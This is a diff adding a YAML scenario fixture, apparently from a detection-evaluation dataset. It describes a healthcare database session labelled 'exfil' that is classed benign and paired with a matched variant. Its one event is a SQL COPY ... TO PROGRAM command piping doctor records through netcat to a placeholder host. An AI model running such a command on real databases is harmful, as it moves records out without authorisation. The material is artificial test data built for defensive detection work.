@@ -1,0 +1,30 @@
+scenario_id: gen_healthcare_79_copy_to_program_ben_2300b
+family_id: gen_healthcare_79_copy_to_program_fam_2300
+domain: healthcare
+time_of_day: 01:35
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: exfil
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT doctor_id, specialty FROM doctors WHERE department_id = '1')
+      TO PROGRAM 'nc warehouse-sync.datasink.example 443'
+    connects_to:
+      ip: 198.51.100.230
+      port: 8443
+matched_pair_id: gen_healthcare_79_copy_to_program_pair_2300
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
